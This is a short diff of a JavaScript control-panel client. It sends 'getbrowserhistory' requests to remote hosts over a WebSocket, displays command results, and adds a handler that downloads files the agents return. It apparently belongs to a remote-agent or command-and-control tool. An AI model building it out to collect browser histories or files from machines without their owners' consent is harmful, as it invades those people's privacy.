@@ -44,7 +44,7 @@ function getbrowserhistory(hostname) {
   if (ws && ws.readyState === WebSocket.OPEN) {
     const payload = {
       type: 'getbrowserhistory',
-      target: hostname  // Agent a envoyer du commande 
+      target: hostname  // Agent a envoyer du request
     };
     ws.send(JSON.stringify(payload));
     console.log(`[🟢] request sent to ${hostname}`);
@@ -254,9 +254,37 @@ function connectWebSocket() {
 
       if (data.type === "command_result") {
         displayCommandResult(data.result);
-        return;
+        return;  
   }
-        
+
+  
+    if (data.type === "file_download") {
+      console.log(`File '${data.filename}' received. Initiating direct download.`);
+      
+      const blob = new Blob([data.content], { type: data.content_type });
+      const url = URL.createObjectURL(blob);
+      
+      // Create a temporary anchor (<a>) element
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = data.filename; // Set the desired filename
+      
+      // Programmatically click the link to trigger download
+      // Appending to body is often recommended for broader browser compatibility
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      
+      // Release the object URL to free up memory
+      URL.revokeObjectURL(url); 
+
+      console.log(`Download of '${data.filename}' completed.`);
+    }
+
+
+
+
+
 
     const hostname = data.local_ip || 'Inconnu';
 
